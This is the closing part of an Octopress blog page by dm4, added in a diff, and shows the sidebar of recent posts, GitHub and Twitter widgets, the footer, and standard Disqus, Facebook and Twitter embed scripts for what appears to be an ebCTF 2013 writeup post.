+      <li class="post">
+        <a href="/blog/2013/01/27/command-line-xiao-zhi-shi/">Command Line 小知識</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2012/07/26/hitcon-2012-wargame-notes-part-2/">HITCON 2012 Wargame Notes - Part 2</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2012/07/24/firefox-hackbar-font-setting-on-mac-osx/">Firefox HackBar Font Setting on Mac OSX</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2012/07/22/hitcon-2012-wargame-notes/">HITCON 2012 Wargame Notes</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2012/05/11/dot-bashrc-sourced-twice/">.bashrc Sourced Twice</a>
+      </li>
+    
+  </ul>
+</section>
+
+<section>
+  <h1>GitHub Repos</h1>
+  <ul id="gh_repos">
+    <li class="loading">Status updating...</li>
+  </ul>
+  
+  <a href="https://github.com/dm4">@dm4</a> on GitHub
+  
+  <script type="text/javascript">
+    $(document).ready(function(){
+        if (!window.jXHR){
+            var jxhr = document.createElement('script');
+            jxhr.type = 'text/javascript';
+            jxhr.src = '/javascripts/libs/jXHR.js';
+            var s = document.getElementsByTagName('script')[0];
+            s.parentNode.insertBefore(jxhr, s);
+        }
+
+        github.showRepos({
+            user: 'dm4',
+            count: 5,
+            skip_forks: true,
+            target: '#gh_repos'
+        });
+    });
+  </script>
+  <script src="/javascripts/github.js" type="text/javascript"> </script>
+</section>
+
+
+
+<section class="googleplus googleplus-hidden">
+  <h1>
+    <a href="https://plus.google.com/111055170376328497079?rel=author">
+      <img src="http://www.google.com/images/icons/ui/gprofile_button-32.png" width="32" height="32">
+      Google+
+    </a>
+  </h1>
+</section>
+
+
+<section>
+  <h1>Twitter</h1>
+  <a class="twitter-timeline" href="https://twitter.com/dm4" data-widget-id="398539610571014144" data-tweet-limit="5" data-chrome="noscrollbar nofooter transparent">Tweets by @dm4</a>
+</section>
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2013 - dm4 -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+<script type="text/javascript">
+      var disqus_shortname = 'dm4';
+      
+        
+        // var disqus_developer = 1;
+        var disqus_identifier = 'http://blog.dm4.tw/blog/2013/11/08/ebctf-2013-writeup/';
+        var disqus_url = 'http://blog.dm4.tw/blog/2013/11/08/ebctf-2013-writeup/';
+        var disqus_script = 'embed.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+<div id="fb-root"></div>
+<script>(function(d, s, id) {
+  var js, fjs = d.getElementsByTagName(s)[0];
+  if (d.getElementById(id)) {return;}
+  js = d.createElement(s); js.id = id; js.async = true;
+  js.src = "//connect.facebook.net/en_US/all.js#appId=212934732101925&xfbml=1";
+  fjs.parentNode.insertBefore(js, fjs);
+}(document, 'script', 'facebook-jssdk'));</script>
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
